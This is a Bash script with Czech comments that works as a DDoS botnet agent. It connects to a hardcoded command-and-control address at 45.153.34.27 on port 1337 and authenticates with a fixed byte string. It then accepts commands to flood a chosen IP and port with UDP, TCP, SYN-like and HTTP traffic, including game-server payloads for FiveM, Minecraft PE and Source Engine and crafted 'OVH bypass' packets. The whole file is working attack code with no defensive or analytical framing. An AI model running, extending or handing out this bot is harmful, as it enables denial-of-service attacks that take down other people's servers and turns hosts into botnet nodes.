#!/bin/bash

# Konfigurace C2 serveru (doplň dle potřeby)
C2_ADDRESS="45.153.34.27"
C2_PORT=1337

# Asociativní pole pro sledování běžících útoků podle uživatele
declare -A USER_ATTACKS

# Payloady (hex sekvence)
PAYLOAD_FIVEM="\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
PAYLOAD_VSE="\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
PAYLOAD_MCPE="\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73"
PAYLOAD_HEX="\x55\x55\x55\x55\x00\x00\x00\x01"

HEX_VALUES=(2 4 8 16 32 64 128)
PACKET_SIZES=(1024 2048)

# Získání architektury
get_architecture() {
    uname -m 2>/dev/null || echo "unknown"
}

# Generátor koncových znaků
generate_end() {
    local length=${1:-4}
    local chars=${2:-'\n\r'}
    local result=""
    for ((i=0; i<length; i++)); do
        result+="${chars:$((RANDOM % ${#chars})):1}"
    done
    printf "%b" "$result"
}

# Builder pro OVH útoky (vrací seznam packetů)
OVH_BUILDER() {
    local ip="$1"
    local port="$2"
    local random_part=""
    for ((i=0; i<2048; i++)); do
        printf -v byte "\\x%02x" $((RANDOM % 256))
        random_part+="$byte"
    done
    local paths=('/0/0/0/0/0/0' '/0/0/0/0/0/0/' '\\0\\0\\0\\0\\0\\0' '\\0\\0\\0\\0\\0\\0\\')
    local packets=()
    for p in "${paths[@]}"; do
        end=$(generate_end)
        packet=$(printf "PGET %s%s HTTP/1.1\nHost: %s:%s%b" "$p" "$random_part" "$ip" "$port" "$end")
        packets+=("$packet")
    done
    printf "%s\n" "${packets[@]}"
}

# Jednotlivé útoky – každý běží jako samostatný proces a ukončí se po čase nebo při vytvoření stop souboru
attack_ovh_tcp() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    mapfile -t packets < <(OVH_BUILDER "$ip" "$port")
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        for packet in "${packets[@]}"; do
            for _ in {1..10}; do
                timeout 1 bash -c "echo -ne \"$packet\" > /dev/tcp/$ip/$port" 2>/dev/null
            done
        done
    done
    rm -f "$stop_file"
}

attack_ovh_udp() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    mapfile -t packets < <(OVH_BUILDER "$ip" "$port")
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        for packet in "${packets[@]}"; do
            for _ in {1..10}; do
                echo -ne "$packet" | nc -u -w1 "$ip" "$port" 2>/dev/null
            done
        done
    done
    rm -f "$stop_file"
}

attack_fivem() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        echo -ne "$PAYLOAD_FIVEM" | nc -u -w1 "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

attack_mcpe() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        echo -ne "$PAYLOAD_MCPE" | nc -u -w1 "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

attack_vse() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        echo -ne "$PAYLOAD_VSE" | nc -u -w1 "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

attack_hex() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        echo -ne "$PAYLOAD_HEX" | nc -u -w1 "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

attack_udp_bypass() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        size=${PACKET_SIZES[$RANDOM % ${#PACKET_SIZES[@]}]}
        dd if=/dev/urandom bs="$size" count=1 2>/dev/null | nc -u -w1 "$ip" "$port" 2>/dev/null
    done
    rm -f "$stop_file"
}

attack_tcp_bypass() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        size=${PACKET_SIZES[$RANDOM % ${#PACKET_SIZES[@]}]}
        ( dd if=/dev/urandom bs="$size" count=1 2>/dev/null | timeout 2 nc "$ip" "$port" 2>/dev/null ) &
        wait $! 2>/dev/null
    done
    rm -f "$stop_file"
}

attack_tcp_udp_bypass() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        size=${PACKET_SIZES[$RANDOM % ${#PACKET_SIZES[@]}]}
        if [[ $((RANDOM % 2)) -eq 0 ]]; then
            dd if=/dev/urandom bs="$size" count=1 2>/dev/null | nc -u -w1 "$ip" "$port" 2>/dev/null
        else
            ( dd if=/dev/urandom bs="$size" count=1 2>/dev/null | timeout 2 nc "$ip" "$port" 2>/dev/null ) &
            wait $! 2>/dev/null
        fi
    done
    rm -f "$stop_file"
}

attack_syn() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        size=${PACKET_SIZES[$RANDOM % ${#PACKET_SIZES[@]}]}
        timeout 1 nc "$ip" "$port" < /dev/urandom 2>/dev/null &
    done
    rm -f "$stop_file"
}

# Generátor User-Agent (zjednodušený)
rand_ua() {
    local agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
    )
    echo "${agents[$RANDOM % ${#agents[@]}]}"
}

attack_http_get() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        ua=$(rand_ua)
        ( printf "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n" "$ip" "$ua" | nc "$ip" "$port" 2>/dev/null ) &
        wait $! 2>/dev/null
    done
    rm -f "$stop_file"
}

attack_http_post() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    local payload="757365726e616d653d61646d696e2670617373776f72643d70617373776f726431323326656d61696c3d61646d696e406578616d706c652e636f6d267375626d69743d6c6f67696e"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        ua=$(rand_ua)
        ( printf "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: keep-alive\r\n\r\n%s" \
            "$ip" "$ua" ${#payload} "$payload" | nc "$ip" "$port" 2>/dev/null ) &
        wait $! 2>/dev/null
    done
    rm -f "$stop_file"
}

attack_browser() {
    local ip="$1"; local port="$2"; local end_time="$3"; local stop_file="$4"
    while [[ $(date +%s) -lt $end_time ]] && [[ ! -f "$stop_file" ]]; do
        ua=$(rand_ua)
        ( printf "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n" \
            "$ip" "$ua" | nc "$ip" "$port" 2>/dev/null ) &
        wait $! 2>/dev/null
    done
    rm -f "$stop_file"
}

# Spuštění útoku v samostatných procesech (odpovídá vláknům)
start_attack() {
    local method="$1"
    local ip="$2"
    local port="$3"
    local duration="$4"
    local threads="$5"
    local username="$6"

    local end_time=$(( $(date +%s) + duration ))

    for ((i=0; i<threads; i++)); do
        local stop_file="/tmp/attack_stop_${username}_${RANDOM}_${i}"
        (
            case "$method" in
                .OVHTCP) attack_ovh_tcp "$ip" "$port" "$end_time" "$stop_file" ;;
                .OVHUDP) attack_ovh_udp "$ip" "$port" "$end_time" "$stop_file" ;;
                .FIVEM) attack_fivem "$ip" "$port" "$end_time" "$stop_file" ;;
                .MCPE) attack_mcpe "$ip" "$port" "$end_time" "$stop_file" ;;
                .VSE) attack_vse "$ip" "$port" "$end_time" "$stop_file" ;;
                .HEX) attack_hex "$ip" "$port" "$end_time" "$stop_file" ;;
                .UDP) attack_udp_bypass "$ip" "$port" "$end_time" "$stop_file" ;;
                .TCP) attack_tcp_bypass "$ip" "$port" "$end_time" "$stop_file" ;;
                .MIX) attack_tcp_udp_bypass "$ip" "$port" "$end_time" "$stop_file" ;;
                .SYN) attack_syn "$ip" "$port" "$end_time" "$stop_file" ;;
                .HTTPGET) attack_http_get "$ip" "$port" "$end_time" "$stop_file" ;;
                .HTTPPOST) attack_http_post "$ip" "$port" "$end_time" "$stop_file" ;;
                .BROWSER) attack_browser "$ip" "$port" "$end_time" "$stop_file" ;;
                *) echo "Neznámý method: $method" ;;
            esac
        ) &
        local pid=$!
        USER_ATTACKS["$username"]+="$pid $stop_file "
    done
}

# Zastavení všech útoků daného uživatele
stop_attacks() {
    local username="$1"
    if [[ -n "${USER_ATTACKS[$username]}" ]]; then
        local entries=(${USER_ATTACKS[$username]})
        for ((i=0; i<${#entries[@]}; i+=2)); do
            local pid="${entries[i]}"
            local stop_file="${entries[i+1]}"
            touch "$stop_file"       # signál pro ukončení smyčky
            kill "$pid" 2>/dev/null  # ukončení procesu
        done
        unset USER_ATTACKS["$username"]
    fi
}

# Hlavní smyčka – připojení k C2, autentizace a příkazy
main() {
    while true; do
        # Otevření TCP spojení
        exec {fd}<>/dev/tcp/$C2_ADDRESS/$C2_PORT 2>/dev/null
        if [[ $? -ne 0 ]]; then
            sleep 120
            continue
        fi

        # Autentizace – čeká na "Username" a pošle architekturu
        while true; do
            IFS= read -r -u $fd line
            [[ "$line" == *"Username"* ]] && { get_architecture >&$fd; break; }
        done

        # Čeká na "Password" a pošle 5 bytů: \xff\xff\xff\xff\x3d
        while true; do
            IFS= read -r -u $fd line
            [[ "$line" == *"Password"* ]] && { printf "\xff\xff\xff\xff\x3d" >&$fd; break; }
        done

        # Příkazová smyčka
        while true; do
            IFS= read -r -u $fd line || break
            line=$(echo "$line" | tr -d '\r\n')
            args=($line)
            cmd="${args[0]}"

            if [[ "$cmd" == "PING" ]]; then
                echo "PONG" >&$fd
            elif [[ "$cmd" == "STOP" && ${#args[@]} -gt 1 ]]; then
                stop_attacks "${args[1]}"
            else
                # FORMÁT: METHOD IP PORT DURATION THREADS [USERNAME]
                method="$cmd"
                ip="${args[1]}"
                port="${args[2]}"
                duration="${args[3]}"
                threads="${args[4]}"
                username="${args[5]:-default}"
                start_attack "$method" "$ip" "$port" "$duration" "$threads" "$username"
            fi
        done

        exec {fd}<&-  # zavření spojení
        sleep 120
    done
}

main
